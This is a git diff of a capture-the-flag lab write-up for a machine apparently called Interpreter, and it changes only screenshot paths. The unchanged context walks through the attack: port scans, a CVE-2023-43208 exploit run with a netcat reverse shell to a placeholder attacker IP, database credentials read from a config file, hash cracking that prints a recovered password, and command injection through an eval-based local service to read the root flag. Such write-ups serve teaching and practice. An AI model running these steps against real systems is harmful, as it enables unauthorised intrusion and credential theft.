@@ -45,7 +45,7 @@ Check if the host is alive using ICMP:
 ping -c 1 10.129.23.60
 ```
 
-![ping](interpreter_01_ping.png)
+![ping](screenshots/interpreter_01_ping.png)
 
 ---
 ### 1.2 Port Scanning
@@ -63,7 +63,7 @@ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.23.60 -oG allPorts
 - `-Pn` : Skip host discovery  
 - `-oG` : Output in grepable format  
 
-![allports](interpreter_02_nmap_allports.png)
+![allports](screenshots/interpreter_02_nmap_allports.png)
 
 Extract the open ports:
 
@@ -71,7 +71,7 @@ Extract the open ports:
 extractPorts allPorts
 ```
 
-![extractports](interpreter_03_extractports.png)
+![extractports](screenshots/interpreter_03_extractports.png)
 
 ---
 ### 1.3 Targeted Scan
@@ -87,8 +87,8 @@ cat targeted
 - `-sV` : Detect service versions  
 - `-oN` : Output in human-readable format  
 
-![targeted 1](interpreter_04_nmap_targeted_1.png)
-![targeted 2](interpreter_05_nmap_targeted_2.png)
+![targeted 1](screenshots/interpreter_04_nmap_targeted_1.png)
+![targeted 2](screenshots/interpreter_05_nmap_targeted_2.png)
 
 **Findings:**
 
@@ -111,8 +111,8 @@ whatweb http://10.129.23.60/
 curl http://10.129.23.60/
 ```
 
-![whatweb http landing](interpreter_06_whatweb_http.png)
-![curl http landing](interpreter_07_http_landing.png)
+![whatweb http landing](screenshots/interpreter_06_whatweb_http.png)
+![curl http landing](screenshots/interpreter_07_http_landing.png)
 
 ---
 ### 2.2 HTTPS administrator endpoints (`webadmin`, `webstart`, launcher probe)
@@ -124,9 +124,9 @@ curl -k -i https://10.129.23.60/webadmin/Index.action
 curl -k -i https://10.129.23.60/launcher/
 ```
 
-![curl webadmin index](interpreter_08_curl_webadmin_index.png)
-![mirth webadmin ui](interpreter_09_mirth_webadmin_ui.png)
-![curl launcher 404](interpreter_11_launcher_404.png)
+![curl webadmin index](screenshots/interpreter_08_curl_webadmin_index.png)
+![mirth webadmin ui](screenshots/interpreter_09_mirth_webadmin_ui.png)
+![curl launcher 404](screenshots/interpreter_11_launcher_404.png)
 
 The WebStart metadata is also useful because it pins the **client/server integration version** and download paths:
 
@@ -135,7 +135,7 @@ curl -k https://10.129.23.60/webstart.jnlp -o webstart.jnlp
 cat webstart.jnlp
 ```
 
-![webstart jnlp](interpreter_10_webstart_jnlp.png)
+![webstart jnlp](screenshots/interpreter_10_webstart_jnlp.png)
 
 ---
 ## 3. Foothold
@@ -151,7 +151,7 @@ nc -lvnp 4444
 python3 CVE-2023-43208.py -u https://10.129.23.60 -c 'nc -c sh <ATTACKER_IP> 4444'
 ```
 
-![cve 2023 43208 poc](interpreter_12_cve_2023_43208_poc.png)
+![cve 2023 43208 poc](screenshots/interpreter_12_cve_2023_43208_poc.png)
 
 Stabilize the shell enough to confirm identity and hostname:
 
@@ -162,7 +162,7 @@ id
 hostname
 ```
 
-![mirth shell identity](interpreter_13_mirth_shell_identity.png)
+![mirth shell identity](screenshots/interpreter_13_mirth_shell_identity.png)
 
 ---
 ### 3.2 Local DB credentials in `mirth.properties` (pivot preparation)
@@ -174,8 +174,8 @@ cd /usr/local/mirthconnect/conf
 cat mirth.properties
 ```
 
-![mirth properties db creds](interpreter_14_mirth_properties_01.png)
-![mirth properties db creds](interpreter_15_mirth_properties_02.png)
+![mirth properties db creds](screenshots/interpreter_14_mirth_properties_01.png)
+![mirth properties db creds](screenshots/interpreter_15_mirth_properties_02.png)
 
 ---
 ## 4. Privilege Escalation
@@ -199,8 +199,8 @@ FROM PERSON p
 JOIN PERSON_PASSWORD pp ON p.ID = pp.PERSON_ID;
 ```
 
-![mysql show tables](interpreter_16_mysql_show_tables.png)
-![mysql sedric verifier](interpreter_17_mysql_sedric_verifier.png)
+![mysql show tables](screenshots/interpreter_16_mysql_show_tables.png)
+![mysql sedric verifier](screenshots/interpreter_17_mysql_sedric_verifier.png)
 
 The verifier is **base64**, and decodes to **40 bytes** total. Split the first **8 bytes** as salt and the remaining **32 bytes** as derived material, then wrap for **hashcat**:
 
@@ -212,8 +212,8 @@ echo 'sha256:600000:u/+LBBOUnac=:YshQbDDqCAzy21EdK5OfZBJD1Ne4rXa1VgP5CzLd8Ps=' >
 hashcat -m 10900 hash_sedric.txt /usr/share/wordlists/rockyou.txt
 ```
 
-![verifier hex decode](interpreter_18_verifier_hex_decode.png)
-![hashcat cracked sedric](interpreter_19_hashcat_cracked_sedric.png)
+![verifier hex decode](screenshots/interpreter_18_verifier_hex_decode.png)
+![hashcat cracked sedric](screenshots/interpreter_19_hashcat_cracked_sedric.png)
 
 Recovered (redact if publishing publicly): **`sedric` password cracked to `snowflake1`**.
 
@@ -224,8 +224,8 @@ ssh sedric@10.129.23.60
 cat /home/sedric/user.txt
 ```
 
-![ssh sedric](interpreter_20_ssh_sedric.png)
-![user flag](interpreter_21_user_flag.png)
+![ssh sedric](screenshots/interpreter_20_ssh_sedric.png)
+![user flag](screenshots/interpreter_21_user_flag.png)
 
 ðŸ **User flag obtained**
 
@@ -239,8 +239,8 @@ ps aux | grep "python"
 cat /usr/local/bin/notif.py
 ```
 
-![ps aux python](interpreter_22_ps_aux_python.png)
-![ps aux python](interpreter_23_notify.png)
+![ps aux python](screenshots/interpreter_22_ps_aux_python.png)
+![ps aux python](screenshots/interpreter_23_notify.png)
 
 Reading the script shows a **localhost-only** Flask endpoint on **`127.0.0.1:54321`** and a dangerous `template()` implementation using **`eval(f'''â€¦''')`**.
 
@@ -252,7 +252,7 @@ ps -fp $(pgrep -f '/usr/local/bin/notif.py' | head -n1)
 cat /usr/local/bin/notif.py
 ```
 
-![ss notif listener](interpreter_24_ss_notif_listener.png)
+![ss notif listener](screenshots/interpreter_24_ss_notif_listener.png)
 
 This host did not have `curl` available in the `sedric` shell (`curl: command not found`), so validate the endpoint locally with **Python `requests`**.
 
@@ -277,7 +277,7 @@ print(r.text)
 EOF
 ```
 
-![python requests baseline notif](interpreter_25_python_requests_baseline_notif.png)
+![python requests baseline notif](screenshots/interpreter_25_python_requests_baseline_notif.png)
 
 Exfiltrate **`/root/root.txt`** via the interpreted `firstname` field:
 
@@ -301,7 +301,7 @@ print(r.text)
 EOF
 ```
 
-![python requests root flag via notif](interpreter_26_python_requests_root_flag_via_notif.png)
+![python requests root flag via notif](screenshots/interpreter_26_python_requests_root_flag_via_notif.png)
 
 ðŸ **Root flag obtained**
 
